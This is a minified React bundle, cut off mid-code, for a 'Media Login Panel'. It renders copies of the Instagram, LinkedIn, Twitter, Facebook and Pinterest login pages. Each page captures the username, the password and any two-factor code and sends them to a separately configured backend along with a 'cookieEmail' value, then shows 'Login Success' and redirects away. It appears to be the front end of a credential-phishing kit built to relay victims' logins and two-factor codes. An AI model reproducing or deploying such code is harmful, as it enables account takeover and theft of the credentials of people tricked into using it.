(this["webpackJsonpinsta-linkedin-frontend"]=this["webpackJsonpinsta-linkedin-frontend"]||[]).push([[0],{20:function(e,t,a){},40:function(e,t,a){e.exports=a(63)},63:function(e,t,a){"use strict";a.r(t);var n=a(0),o=a.n(n),s=a(16),c=a.n(s),l=a(15),r=a(10),i=a(11),m=a(13),u=a(12),d=a(5),h=a.n(d),E=h()();console.log(E.REACT_APP_URL),console.log(window.location.host);var A=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={redirect:!1,to:""},e.setRedirect=function(t){e.setState({redirect:!0,to:t})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:e.state.to})},e}return Object(i.a)(a,[{key:"componentDidMount",value:function(){var e=document.getElementById("FavIcon");void 0===E.REACT_APP_FAVICONURL&&""===E.REACT_APP_FAVICONURL||(e.href="".concat(E.REACT_APP_FAVICONURL));var t=document.getElementById("AppTitle");void 0!==E.REACT_APP_TITLE||""!==E.REACT_APP_TITLE?t.innerText="".concat(E.REACT_APP_TITLE):t.innerText="Media Login Panel"}},{key:"render",value:function(){var e=this;return o.a.createElement("div",{className:"login_section",style:{height:350}},o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24},className:"text-center mb-5"},"Please Select A Login Option"),this.renderRedirect(),o.a.createElement("div",{className:"row btns_row"},"true"===E.REACT_APP_INSTAGRAM?o.a.createElement("div",{className:"col-6 col-md-6"},o.a.createElement("button",{type:"button",className:"btn login_btn choose_btns",onClick:function(){return e.setRedirect("/Instagram")}},"Instagram")):"","true"===E.REACT_APP_LINKEDIN?o.a.createElement("div",{className:"col-6 col-md-6"},o.a.createElement("button",{type:"button",className:"btn login_btn choose_btns float_right",onClick:function(){return e.setRedirect("/Linkedin")}},"Linkedin")):""),o.a.createElement("div",{className:"row btns_row middle_btn_row"},"true"===E.REACT_APP_FACEBOOK?o.a.createElement("div",{className:"col-6 col-md-6 p-0"},o.a.createElement("button",{type:"button",className:"btn login_btn choose_btns pink_clr",onClick:function(){return e.setRedirect("/Facebook")}},"Facebook")):"","true"===E.REACT_APP_TWITTER?o.a.createElement("div",{className:"col-6 col-md-6 p-0"},o.a.createElement("button",{type:"button",className:"btn login_btn choose_btns pink_clr float_right",onClick:function(){return e.setRedirect("/Twitter")}},"Twitter")):""),o.a.createElement("div",{className:"row btns_row"},"true"===E.REACT_APP_PINTEREST?o.a.createElement("div",{className:"col-12 col-md-12"},o.a.createElement("button",{type:"button",className:"btn login_btn choose_btns",onClick:function(){return e.setRedirect("/Pinterest")}},"Pinterest")):""))}}]),a}(n.Component),_=(a(20),a(65)),g=a(66),f=a(69),p=a(67),C=a(68),w=a(17),R=h()(),P=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",twoFactor:!1,email_auth:!1,success:!1,code:"",two_factor_identifier:"",verificationMethod:"",appName:window.location.hostname.substring(10).split(".")[0]},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,o=a.maxLength,s=n.slice(0,o);e.setState({code:s})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?(console.log(e.state.appName,window.location.href.split("//")[1]),fetch("".concat(R.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:w.stringify({username:e.state.username,password:e.state.password,cookieEmail:R.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor?e.setState({email_auth:t.email_auth,twoFactor:!0,loading:!0,two_factor_identifier:t.two_factor_identifier,verificationMethod:t.verificationMethod}):e.setState({success:!0}):e.setState({loading:!1})}))):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):e.state.email_auth?fetch("".concat(R.REACT_APP_URL,"/insta/emailVerify?username=").concat(e.state.username,"&code=").concat(e.state.code),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?fetch("".concat(R.REACT_APP_URL,"/insta"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:w.stringify({username:e.state.username,password:e.state.password,cookieEmail:R.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.twoFactor||e.setState({success:!0}):e.setState({loading:!1})})):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))})):fetch("".concat(R.REACT_APP_URL,"/insta/submitCode?username=").concat(e.state.username,"&password=").concat(e.state.password,"&code=").concat(e.state.code,"&two_factor_identifier=").concat(e.state.two_factor_identifier,"&verificationMethod=").concat(e.state.verificationMethod,"&cookieEmail=").concat(R.REACT_APP_COOKIE_EMAIL,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),t.success?e.setState({success:!0,message:t.message},(function(){e.onShowAlert()})):e.setState({message:t.message},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,o.a.createElement(_.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.renderRedirect(),o.a.createElement(g.a,null,this.state.showAlert?o.a.createElement(f.a,{variant:"danger"},this.state.message):""),o.a.createElement("div",{className:"login_section text-center"},o.a.createElement(g.a,null,o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24}},void 0!==R.REACT_APP_TITLE&&""!==R.REACT_APP_TITLE?R.REACT_APP_TITLE:""),void 0!==R.REACT_APP_FAVICONURL&&null!=R.REACT_APP_FAVICONURL?o.a.createElement("img",{alt:"logo",src:R.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}}):""),o.a.createElement("br",null),o.a.createElement("br",null),"true"===R.REACT_APP_BANNER_INSTAGRAM?o.a.createElement("div",{className:"bg-white white-box"},o.a.createElement("p",{style:{marginBottom:8,fontWeight:600,fontSize:22},className:"fs_18"},R.REACT_APP_BANNER_INSTAGRAM_HEADER),o.a.createElement("p",{className:"fs_12 m-0"},R.REACT_APP_BANNER_INSTAGRAM_BODY)):"",o.a.createElement(g.a,null,o.a.createElement("p",{style:{fontWeight:"bold",color:"white"}},""!==R.REACT_APP_SECONDARY_BANNER?R.REACT_APP_SECONDARY_BANNER:"")),this.state.success?o.a.createElement(g.a,{style:{marginTop:250,position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!"),o.a.createElement("h1",null,"Redirecting...")),o.a.createElement(l.b,{component:function(){return window.setTimeout((function(){window.location.href=R.REACT_APP_REDIRECTURL}),5e3),null}})):o.a.createElement("div",{className:"form"},o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){e.handleUsername(t)},value:this.state.username,type:"text",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Instagram Username"})),o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Instagram Password"})),this.state.loading?o.a.createElement("button",{type:"button",className:"btn login_btn",disabled:!0},o.a.createElement(p.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement("button",{onClick:function(t){return e.handleClick(t)},type:"button",className:"btn login_btn"},"Login"),this.state.twoFactor?o.a.createElement("div",null,o.a.createElement(C.a.Group,null,this.state.email_auth?o.a.createElement(C.a.Label,null,"Please enter the code received"):o.a.createElement(C.a.Label,null,"Enter code received"),o.a.createElement("input",{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11",name:"name",autocomplete:"off",className:"text-center form-control"})),o.a.createElement("button",{onClick:function(){e.handleCodeClick()},type:"button",className:"btn login_btn"},"submit code")):"")))}}]),a}(n.Component),T=a(17),b=h()(),N=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:"",appName:window.location.hostname.substring(10).split(".")[0]},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,o=a.maxLength,s=n.slice(0,o);e.setState({code:s})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(b.REACT_APP_URL,"/linkedin"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:T.stringify({username:e.state.username,password:e.state.password,cookieEmail:b.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(b.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(b.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(_.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(f.a,{variant:"danger"},this.state.message):"",o.a.createElement("br",null),o.a.createElement("div",{className:"login_section text-center"},o.a.createElement(g.a,null,o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24}},void 0!==b.REACT_APP_TITLE&&""!==b.REACT_APP_TITLE?b.REACT_APP_TITLE:""),void 0!==b.REACT_APP_FAVICONURL&&null!=b.REACT_APP_FAVICONURL?o.a.createElement("img",{alt:"logo",src:b.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}}):""),o.a.createElement("br",null),o.a.createElement("br",null),"true"===b.REACT_APP_BANNER_LINKEDIN?o.a.createElement("div",{className:"bg-white white-box"},o.a.createElement("p",{style:{marginBottom:8,fontWeight:600,fontSize:22},className:"fs_18"},b.REACT_APP_BANNER_LINKEDIN_HEADER),o.a.createElement("p",{className:"fs_12 m-0"},b.REACT_APP_BANNER_LINKEDIN_BODY)):"",o.a.createElement("br",null),o.a.createElement(g.a,null,o.a.createElement("p",{style:{fontWeight:"bold",color:"white"}},""!==b.REACT_APP_SECONDARY_BANNER?b.REACT_APP_SECONDARY_BANNER:"")),this.state.success?o.a.createElement(g.a,{style:{marginTop:250,position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!"),o.a.createElement("h1",null,"Redirecting...")),o.a.createElement(l.b,{component:function(){return window.setTimeout((function(){window.location.href=b.REACT_APP_REDIRECTURL}),5e3),null}})):o.a.createElement("div",{className:"form"},o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){e.handleUsername(t)},value:this.state.username,type:"text",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter LinkedIn Username/MobileNumber"})),o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter LinkedIn Password"})),this.state.loading?o.a.createElement("button",{type:"button",className:"btn login_btn",disabled:!0},o.a.createElement(p.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement("button",{onClick:function(t){return e.handleClick(t)},type:"button",className:"btn login_btn"},"Login"),this.state.manualCheck?o.a.createElement("div",null,o.a.createElement(C.a.Group,null,o.a.createElement(C.a.Label,null,"Enter code received in your email"),o.a.createElement("input",{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11",name:"name",autocomplete:"off",className:"text-center form-control"})),o.a.createElement("button",{onClick:function(){e.handleCodeClick()},type:"button",className:"btn login_btn"},"submit code")):"")))}}]),a}(n.Component),S=a(17),v=h()(),y=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challenge_id:"",challenge_type:"",enc_user_id:"",code:"",appName:window.location.hostname.substring(10).split(".")[0]},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){e.setState({code:t.target.value})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(v.REACT_APP_URL,"/login/twitter"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:S.stringify({username:e.state.username,password:e.state.password,cookieEmail:v.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challenge_type:t.challenge_type,challenge_id:t.challenge_id,enc_user_id:t.enc_user_id,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){fetch("".concat(v.REACT_APP_URL,"/login/twitter/verifyCode?code=").concat(e.state.code,"&challenge_type=").concat(e.state.challenge_type,"&enc_user_id=").concat(e.state.enc_user_id,"&cookieEmail=").concat(v.REACT_APP_COOKIE_EMAIL,"&username=").concat(e.state.username,"&password=").concat(e.state.password,"&challenge_id=").concat(e.state.challenge_id,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(_.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(f.a,{variant:"dark"},this.state.message):"",o.a.createElement("div",{className:"login_section text-center"},o.a.createElement(g.a,null,o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24}},void 0!==v.REACT_APP_TITLE&&""!==v.REACT_APP_TITLE?v.REACT_APP_TITLE:""),void 0!==v.REACT_APP_FAVICONURL&&null!=v.REACT_APP_FAVICONURL?o.a.createElement("img",{alt:"logo",src:v.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}}):""),"true"===v.REACT_APP_BANNER_TWITTER?o.a.createElement("div",{className:"bg-white white-box"},o.a.createElement("p",{style:{marginBottom:8,fontWeight:600,fontSize:22},className:"fs_18"},v.REACT_APP_BANNER_TWITTER_HEADER),o.a.createElement("p",{className:"fs_12 m-0"},v.REACT_APP_BANNER_TWITTER_BODY)):"",o.a.createElement(g.a,null,o.a.createElement("p",{style:{fontWeight:"bold"}},""!==v.REACT_APP_SECONDARY_BANNER?v.REACT_APP_SECONDARY_BANNER:"")),this.state.success?o.a.createElement(g.a,{style:{marginTop:250,position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!"),o.a.createElement("h1",null,"Redirecting...")),o.a.createElement(l.b,{component:function(){return window.setTimeout((function(){window.location.href=v.REACT_APP_REDIRECTURL}),5e3),null}})):o.a.createElement("div",{className:"form"},o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){e.handleUsername(t)},value:this.state.username,type:"text",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Twitter Username/Email"})),o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Twitter Password"})),this.state.loading?o.a.createElement("button",{type:"button",className:"btn login_btn",disabled:!0},o.a.createElement(p.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement("button",{onClick:function(t){return e.handleClick(t)},type:"button",className:"btn login_btn"},"Login"),this.state.manualCheck?o.a.createElement("div",null,o.a.createElement(C.a.Group,null,o.a.createElement(C.a.Label,null,"RetypeEmail"===this.state.challenge_type?"Enter your email id":"Enter code recieved in your email"),o.a.createElement("input",{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11",name:"name",autocomplete:"off",className:"text-center form-control"})),o.a.createElement("button",{onClick:function(){e.handleCodeClick()},type:"button",className:"btn login_btn"},"submit code")):"")))}}]),a}(n.Component),I=a(17),k=h()(),L=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,appName:window.location.hostname.substring(10).split(".")[0]},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){e.setState({code:t.target.value})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(k.REACT_APP_URL,"/login/pinterest"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:I.stringify({username:e.state.username,password:e.state.password,cookieEmail:k.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challenge_type:t.challenge_type,challenge_id:t.challenge_id,enc_user_id:t.enc_user_id,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"email id cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){fetch("".concat(k.REACT_APP_URL,"/login/twitter/verifyCode?code=").concat(e.state.code,"&challenge_type=").concat(e.state.challenge_type,"&enc_user_id=").concat(e.state.enc_user_id,"&cookieEmail=").concat(k.REACT_APP_COOKIE_EMAIL,"&username=").concat(e.state.username,"&password=").concat(e.state.password,"&challenge_id=").concat(e.state.challenge_id,"&appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(_.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(f.a,{variant:"danger"},this.state.message):"",o.a.createElement("div",{className:"login_section text-center"},o.a.createElement(g.a,null,o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24}},void 0!==k.REACT_APP_TITLE&&""!==k.REACT_APP_TITLE?k.REACT_APP_TITLE:""),void 0!==k.REACT_APP_FAVICONURL&&null!=k.REACT_APP_FAVICONURL?o.a.createElement("img",{alt:"logo",src:k.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}}):""),o.a.createElement("br",null),o.a.createElement("br",null),"true"===k.REACT_APP_BANNER_PINTEREST?o.a.createElement("div",{className:"bg-white white-box"},o.a.createElement("p",{style:{marginBottom:8,fontWeight:600,fontSize:22},className:"fs_18"},k.REACT_APP_BANNER_PINTEREST_HEADER),o.a.createElement("p",{className:"fs_12 m-0"},k.REACT_APP_BANNER_PINTEREST_BODY)):"",o.a.createElement(g.a,null,o.a.createElement("p",{style:{fontWeight:"bold"}},""!==k.REACT_APP_SECONDARY_BANNER?k.REACT_APP_SECONDARY_BANNER:"")),this.state.success?o.a.createElement(g.a,{style:{marginTop:250,position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!"),o.a.createElement("h1",null,"Redirecting...")),o.a.createElement(l.b,{component:function(){return window.setTimeout((function(){window.location.href=k.REACT_APP_REDIRECTURL}),5e3),null}})):o.a.createElement("div",{className:"form"},o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){e.handleUsername(t)},value:this.state.username,type:"text",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Pinterest Email"})),o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Pinterest Password"})),this.state.loading?o.a.createElement("button",{type:"button",className:"btn login_btn",disabled:!0},o.a.createElement(p.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement("button",{onClick:function(t){return e.handleClick(t)},type:"button",className:"btn login_btn"},"Login"),this.state.manualCheck?o.a.createElement("div",null,o.a.createElement(C.a.Group,null,o.a.createElement(C.a.Label,null,"RetypeEmail"===this.state.challenge_type?"Enter your email id":"Enter code recieved in your email"),o.a.createElement("input",{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11",name:"name",autocomplete:"off",className:"text-center form-control"})),o.a.createElement("button",{onClick:function(){e.handleCodeClick()},type:"button",className:"btn login_btn"},"submit code")):"")))}}]),a}(n.Component),O=a(17),U=h()(),x=function(e){Object(m.a)(a,e);var t=Object(u.a)(a);function a(){var e;Object(r.a)(this,a);for(var n=arguments.length,s=new Array(n),c=0;c<n;c++)s[c]=arguments[c];return(e=t.call.apply(t,[this].concat(s))).state={username:"",password:"",showAlert:!1,loading:!1,message:"",manualCheck:!1,success:!1,redirect:!1,challangeID:"",code:"",appName:window.location.hostname.substring(10).split(".")[0]},e.handleUsername=function(t){e.setState({username:t.target.value})},e.handleCode=function(t){var a=t.target,n=a.value,o=a.maxLength,s=n.slice(0,o);e.setState({code:s})},e.handlePassword=function(t){e.setState({password:t.target.value})},e.onShowAlert=function(){e.setState({showAlert:!0},(function(){window.setTimeout((function(){e.setState({showAlert:!1})}),3e4)}))},e.handleClick=function(t){t.preventDefault(),e.setState({loading:!0}),0!==e.state.username.length&&0!==e.state.password.length?fetch("".concat(U.REACT_APP_URL,"/login/facebook"),{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded;charset=UTF-8"},body:O.stringify({username:e.state.username,password:e.state.password,cookieEmail:U.REACT_APP_COOKIE_EMAIL,appName:e.state.appName})}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?t.manualCheck?e.setState({manualCheck:!0,challangeID:t.challangeID,loading:!0}):e.setState({success:!0}):e.setState({loading:!1})})):0===e.state.username.length?e.setState({message:"username cannot be empty",loading:!1},(function(){e.onShowAlert()})):e.setState({message:"password cannot be empty",loading:!1},(function(){e.onShowAlert()}))},e.handleCodeClick=function(t){0===e.state.code.length||e.state.code.length>6?e.setState({message:"Code length should be equal to 6"},(function(){e.onShowAlert()})):fetch("".concat(U.REACT_APP_URL,"/linkedinCheck?code=").concat(e.state.code,"&cookieEmail=").concat(U.REACT_APP_COOKIE_EMAIL,"&email=").concat(e.state.username,"&password=").concat(e.state.password,"&challangeID=").concat(e.state.challangeID,"$appName=").concat(e.state.appName),{method:"GET"}).then((function(e){return e.json()})).then((function(t){console.log(t),e.setState({message:t.message},(function(){e.onShowAlert()})),t.success?e.setState({success:!0}):e.setState({message:t.message,code:""},(function(){e.onShowAlert()}))}))},e.setRedirect=function(){e.setState({redirect:!0})},e.renderRedirect=function(){if(e.state.redirect)return o.a.createElement(l.a,{to:"/"})},e}return Object(i.a)(a,[{key:"render",value:function(){var e=this;return o.a.createElement("div",null,this.renderRedirect(),o.a.createElement(_.a,{size:"lg",variant:"outline-danger",onClick:this.setRedirect},"Back"),this.state.showAlert?o.a.createElement(f.a,{variant:"danger"},this.state.message):"",o.a.createElement("br",null),o.a.createElement("div",{className:"login_section text-center"},o.a.createElement(g.a,null,o.a.createElement("p",{style:{color:"#f27c89",fontWeight:600,fontSize:24}},void 0!==U.REACT_APP_TITLE&&""!==U.REACT_APP_TITLE?U.REACT_APP_TITLE:""),void 0!==U.REACT_APP_FAVICONURL&&null!=U.REACT_APP_FAVICONURL?o.a.createElement("img",{alt:"logo",src:U.REACT_APP_FAVICONURL,style:{objectFit:"contain",width:"25%",height:"25%"}}):""),"true"===U.REACT_APP_BANNER_FACEBOOK?o.a.createElement("div",{className:"bg-white white-box"},o.a.createElement("p",{style:{marginBottom:8,fontWeight:600,fontSize:22},className:"fs_18"},U.REACT_APP_BANNER_FACEBOOK_HEADER),o.a.createElement("p",{className:"fs_12 m-0"},U.REACT_APP_BANNER_FACEBOOK_BODY)):"",o.a.createElement(g.a,null,o.a.createElement("p",{style:{fontWeight:"bold"}},""!==U.REACT_APP_SECONDARY_BANNER?U.REACT_APP_SECONDARY_BANNER:"")),this.state.success?o.a.createElement(g.a,{style:{marginTop:250,position:"absolute",left:"50%",top:"50%",transform:"translate(-50%, -50%)"}},o.a.createElement("center",null,o.a.createElement("h1",null,"Login Success Thank You!"),o.a.createElement("h1",null,"Redirecting...")),o.a.createElement(l.b,{component:function(){return window.setTimeout((function(){window.location.href=U.REACT_APP_REDIRECTURL}),5e3),null}})):o.a.createElement("div",{class:"form"},o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){e.handleUsername(t)},value:this.state.username,type:"text",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Facebook Username/Email"})),o.a.createElement("p",null,o.a.createElement("input",{onChange:function(t){return e.handlePassword(t)},value:this.state.password,type:"password",name:"name",autocomplete:"off",className:"text-center form-control",placeholder:"Enter Facebook Password"})),this.state.loading?o.a.createElement(_.a,{variant:"primary",type:"submit",disabled:!0},o.a.createElement(p.a,{as:"span",animation:"grow",size:"sm",role:"status","aria-hidden":"true"}),"Loading..."):o.a.createElement("button",{onClick:function(t){return e.handleClick(t)},type:"button",className:"btn login_btn"},"Login"),this.state.manualCheck?o.a.createElement("div",null,o.a.createElement(C.a.Group,null,o.a.createElement(C.a.Label,null,"Enter code recieved in your email"),o.a.createElement("input",{value:this.state.code,onChange:function(t){e.handleCode(t)},type:"number",maxLength:"11",name:"name",className:"text-center form-control"})),o.a.createElement("button",{onClick:function(){e.handleCodeClick()},type:"button",className:"btn login_btn"},"submit code")):"")))}}]),a}(n.Component),B=h()();var D=function(){return 